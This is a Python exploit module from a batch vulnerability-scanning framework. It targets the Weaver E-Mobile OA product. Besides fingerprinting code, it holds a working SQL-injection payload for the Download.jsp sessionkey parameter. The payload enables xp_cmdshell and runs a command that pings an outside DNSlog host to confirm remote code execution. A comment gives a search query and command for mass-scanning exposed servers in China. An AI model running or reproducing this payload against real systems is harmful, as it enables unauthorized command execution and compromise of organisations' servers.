# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from core.utils.dnslog import eyes_dnslog_verify, get_eyes_identifier
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# app="泛微-EMobile" && country="CN"
# python3 batch.py -m exploit.scripts.OA.Weaver.E-Mobile.unauth_Download_rce -cs -fs "app=\"泛微-EMobile\" && country=\"CN\""


class Script(BaseScript):
    name = 'E-Mobile'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = 'https://www.t00ls.com/thread-66649-1-1.html'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['''/mobile/plugin/Download.jsp?sessionkey=1%27%20EXEC%20sp_configure%20%27show%20advanced%20options%27,1%20RECONFIGURE%20EXEC%20sp_configure%20%27xp_cmdshell%27,1%20RECONFIGURE%20exec%20master..xp_cmdshell%20%27ping%20{}.{}''']
        # 相关信息
        self.info = '''2020年就被修复了，只是没有人公布出来，修复代码参考：weaver_security_rules.v202010.xml'''
        # favicon
        self.favicon_md5_list = ['41eca7a9245394106a09b2534d8030df']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.target}/' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/'
            async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                if response is not None:
                    await asyncio.sleep(2)
                    text = await response.text()
                    if 'ecology9/js/lib.js' in text or '/wui/common/css/w7ovfont.css' in text or 'typeof poppedwindow' in text or 'client/jquery.client_wev8.js' in text or '/theme/ecology8/jquery/js/zdialog_wev8.js' in text or 'ecology8/lang/weaver_lang_7_wev8.js' in text:
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
                    if 'ecology_JSessionId' in response.headers.get('Set_Cookie', ''):
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

            url = f'http://{self.target}/favicon.ico' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/favicon.ico'
            favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if favicon_md5 in self.favicon_md5_list:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Connection': "close", 'Accept-Encoding': "gzip, deflate", 'Accept': "*/*", 'Content-Type': "application/x-www-form-urlencoded"})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                verify_random_int = str(random.randint(10000, 99999))
                exec_path = exec_path.format(verify_random_int, get_eyes_identifier())
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                await AsyncFetcher.fetch(session=session, url=url, headers=headers, timeout=self.req_timeout)
                await asyncio.sleep(2)
                text = await eyes_dnslog_verify('dns', verify_random_int)
                if text is not None and text:
                    gLogger.myscan_info('[{} {} Verify:{}] {}'.format(self.name, self.bug_type, verify_random_int, url))
                    return {'name': '{} Download.jsp - Verify:{}'.format(self.name, verify_random_int), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
